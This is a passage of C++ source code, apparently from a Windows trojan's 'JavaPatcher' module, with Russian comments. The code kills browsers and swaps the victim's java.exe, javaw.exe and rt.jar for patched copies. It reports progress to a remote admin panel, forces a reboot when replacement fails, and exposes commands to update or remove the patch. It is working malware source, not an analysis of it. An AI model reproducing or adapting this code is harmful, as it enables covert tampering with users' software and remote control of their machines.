					KillProcess( PIDS[countProcess], 1000 );
				};
				MemFree(PIDS);
				PIDS = 0;
			};	
					
			KillAllBrowsers();

			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
			{
				DBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
				res = true;
			}
			else
			{
				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
				pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
			}
			//Подменяем яву
			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str() );
			if( res )
			{
				//сообщаем админке, что ява патч установлен
				SendLogToAdmin(4);
			}
			else //не удалось что-то заменить, делаем перезагрузку
			{
				#ifdef KillOs_RebootH
				SendLogToAdmin(6);
				Reboot();
				#endif
			}
		};

	}
	SendLogToAdmin(5);

	STR::Free(javaUrl);

	return res;
};

// Функция отправляет setup_patch в отдельном потоке
DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
{
	SendLogToAdmin( (int)num );
	return 0;
}

DWORD WINAPI Run_Path(LPVOID lpData)
{
	char testPath[MAX_PATH];
	if( PatchIsLoaded() ) return 0; //если патч установлен, то не нужно его повторно ставить
	if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
	{
		while( true )
		{
			if( File::IsExists(testPath))
			{
				InitData();
				GetJavaVersion();
				if( javaCompatible >= 0)
				{
					SendLogToAdmin(1);
					StartThread( JavaPatch, NULL );
				}
				break;
			}
			pSleep(5000);
		}
	}
	return 0;
}

bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
{
	DBG( "JavaPatcher", "Обновление явы JavaPatch");
	char fileName[MAX_PATH];
	
	if( GetWorkFolder( fileName, JavaPatcherPidsFile ) )
		pDeleteFileA(fileName);

	if( GetWorkFolder( fileName, "uid.txt" ) )
		pDeleteFileA(fileName);

	GetJavaVersion();
	if( javaCompatible >= 0 )
	{
		JavaPatch(NULL);
	}
	return 0;
}

static void DeletePatchFile( const char* path, const char* nameFile )
{
	char delFile[MAX_PATH];
	m_lstrcpy( delFile, path );
	pPathAppendA( delFile, nameFile );
	if( pDeleteFileA(delFile) == 0 )
		pMoveFileExA( delFile, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
}

bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	DBG( "JavaPatcher", "UnPatch Java ");

	if( !GetJavaVersion() ) return false;

	KillAllBrowsers();
	pSleep(5000);

	char path[MAX_PATH];
	m_lstrcpy( path, javaHome );
	pPathAppendA( path, "lib" );
	//удаляем rt.jar и rt2.jar и rt.ini 
	DeletePatchFile( path, "rt.jar" );
	DeletePatchFile( path, "rt_.jar" );
	DeletePatchFile( path, "rt2.jar" );

	if( GetWorkFolder(path) )
	{
		DeletePatchFile( path, "rt.ini" );
		DeletePatchFile( path, "uid.txt" );
	}
	
	return 0;
}

// Функция добавляет пид текущего процесса в файл
void JavaPatcherAddPidToFile()
{
	char wjDat[MAX_PATH];
	if( GetWorkFolder( wjDat, JavaPatcherPidsFile ) )
	{
		DWORD PID = GetUniquePID();
		if( File::IsExists(wjDat) )
		{
			DWORD size;
			DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
			int count = size / 4;

			for( int i = 0; i < count; i++ )
				if( pids[i] == PID )
				{
					PID = 0; //такой пид уже есть, добавлятьв файл не нужно
					break;
				}
			if( PID ) //добавляем пид
			{
				DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
				pids2[0] = PID;
				m_memcpy( &pids2[1], pids, size );
				File::WriteBufferA( wjDat, pids2, size + 4 );
				MemFree(pids2);
			}
			MemFree(pids);
		}
		else
			File::WriteBufferA( wjDat, &PID, sizeof(PID) );
		pMoveFileExA( wjDat, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
	}
}

// Функция сигнализирует о необходимости запуска патчей
void  JavaPatcherSignal()
{

	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить

	InitData();
	GetJavaVersion();
	StartThread( SendJavaPatchSetupPatch, 0 );

	JavaPatcherAddPidToFile();

	char SignalFile[MAX_PATH];
	if( GetWorkFolder( SignalFile, JavaPatcherSignalFile ) )
	{
		File::WriteBufferA(SignalFile, (LPVOID)"1", 1);
	}
}


//----------------------------------------------------------------------------
//#endif
